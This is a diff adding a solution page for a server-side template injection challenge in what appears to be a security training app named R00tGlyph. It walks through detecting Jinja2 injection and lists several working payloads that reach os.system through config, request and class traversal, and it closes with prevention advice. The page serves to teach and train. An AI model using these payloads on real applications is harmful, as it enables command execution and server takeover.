@@ -1,0 +1,99 @@
+{% extends 'base.html' %}
+
+{% block title %}Solution: Command Injection via Template Engines - R00tGlyph{% endblock %}
+
+{% block content %}
+<div class="row">
+    <div class="col-md-8 offset-md-2">
+        <div class="card">
+            <div class="card-header bg-dark text-white">
+                <h2 class="text-center">Solution: Command Injection via Template Engines</h2>
+            </div>
+            <div class="card-body">
+                <div class="alert alert-info">
+                    <i class="bi bi-info-circle-fill me-2"></i>
+                    <strong>Challenge:</strong> Exploit Server-Side Template Injection (SSTI) to achieve command execution in a report generation system.
+                </div>
+
+                <h3 class="mt-4">Vulnerability Explanation</h3>
+                <p>
+                    This challenge demonstrates Server-Side Template Injection (SSTI) leading to command execution. The report generation system uses Jinja2 templates to process user input, but lacks proper sandboxing, allowing template injection attacks.
+                </p>
+
+                <h3 class="mt-4">Solution Steps</h3>
+                <ol>
+                    <li>
+                        <p><strong>Test template injection:</strong> Try basic template syntax injection.</p>
+                        <pre class="bg-light p-3 rounded"><code>{{7*7}}</code></pre>
+                        <p>If this returns 49, template injection is possible.</p>
+                    </li>
+                    <li>
+                        <p><strong>Access Python objects:</strong> Use template syntax to access Python objects.</p>
+                        <pre class="bg-light p-3 rounded"><code>{{config}}</code></pre>
+                    </li>
+                    <li>
+                        <p><strong>Execute system commands:</strong> Use template injection for command execution.</p>
+                        <pre class="bg-light p-3 rounded"><code>{{__import__('os').system('whoami')}}</code></pre>
+                    </li>
+                    <li>
+                        <p><strong>Alternative command execution:</strong> Try different approaches for command execution.</p>
+                        <pre class="bg-light p-3 rounded"><code>{{config.__class__.__init__.__globals__['os'].system('id')}}</code></pre>
+                    </li>
+                </ol>
+
+                <h3 class="mt-4">SSTI Payloads</h3>
+                <ul>
+                    <li><code>{{__import__('os').system('whoami')}}</code> - Direct import and execution</li>
+                    <li><code>{{config.__class__.__init__.__globals__['os'].system('id')}}</code> - Object traversal</li>
+                    <li><code>{{request.__class__.__init__.__globals__['os'].system('hostname')}}</code> - Request object traversal</li>
+                    <li><code>{{''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].exit()}}</code> - Class traversal</li>
+                </ul>
+
+                <h3 class="mt-4">Template Engine Context</h3>
+                <p>SSTI vulnerabilities are common in:</p>
+                <ul>
+                    <li>Report generation systems</li>
+                    <li>Email template processors</li>
+                    <li>Content management systems</li>
+                    <li>Dynamic web page generators</li>
+                </ul>
+
+                <h3 class="mt-4">Template Engines</h3>
+                <div class="row">
+                    <div class="col-md-6">
+                        <h6>Python:</h6>
+                        <ul>
+                            <li>Jinja2 (Flask)</li>
+                            <li>Django Templates</li>
+                            <li>Mako</li>
+                            <li>Tornado</li>
+                        </ul>
+                    </div>
+                    <div class="col-md-6">
+                        <h6>Other Languages:</h6>
+                        <ul>
+                            <li>Twig (PHP)</li>
+                            <li>Handlebars (JavaScript)</li>
+                            <li>Mustache</li>
+                            <li>Smarty (PHP)</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <h3 class="mt-4">Prevention</h3>
+                <ol>
+                    <li><strong>Template Sandboxing:</strong> Use sandboxed template environments</li>
+                    <li><strong>Input Validation:</strong> Validate all template input</li>
+                    <li><strong>Restricted Globals:</strong> Limit access to dangerous functions</li>
+                    <li><strong>Static Templates:</strong> Use static templates when possible</li>
+                </ol>
+
+                <div class="mt-4">
+                    <a href="{{ url_for('cmdi_level18') }}" class="btn btn-outline-primary"><i class="bi bi-arrow-left me-2"></i>Back to Challenge</a>
+                    <a href="{{ url_for('vulnerabilities') }}" class="btn btn-outline-secondary float-end"><i class="bi bi-list me-2"></i>All Challenges</a>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
